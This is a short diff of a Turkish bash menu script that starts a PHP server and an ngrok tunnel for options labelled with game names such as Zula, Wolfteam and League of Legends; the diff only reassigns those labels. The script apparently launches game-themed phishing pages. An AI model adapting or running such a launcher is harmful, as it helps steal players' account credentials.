@@ -33,7 +33,7 @@ echo -e "\e[31m"
 read -p "| Numara Seçiniz:" islem
 if [[ $islem == 4 || $islem == 04 ]]; then
 	read -p "Port Giriniz: " port
-        echo -e "\e[32mKodunuz Code: zula"
+        echo -e "\e[32mKodunuz Code: wolfteam"
         sleep 2
         echo ""
         echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
@@ -42,7 +42,7 @@ if [[ $islem == 4 || $islem == 04 ]]; then
         php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 5 || $islem == 05 ]]; then
         read -p "Port Giriniz: " port
-        echo -e "\e[32mKodunuz Code: lol"
+        echo -e "\e[32mKodunuz Code: legend"
         sleep 2
         echo ""
         echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
@@ -60,7 +60,7 @@ elif [[ $islem == 3 || $islem == 03 ]]; then
         php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 1 || $islem == 01 ]]; then
         read -p "Port Giriniz: " port 
-	echo -e "\e[32mCode: wolfteam"
+	echo -e "\e[32mCode: zula"
         sleep 2
         echo ""
         echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
@@ -69,7 +69,7 @@ elif [[ $islem == 1 || $islem == 01 ]]; then
         php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 2 || $islem == 02 ]]; then
         read -p "Port Giriniz: " port
-        echo -e "\e[32mKodunuz Code: legend"
+        echo -e "\e[32mKodunuz Code: lol"
         sleep 2
         echo ""
         echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
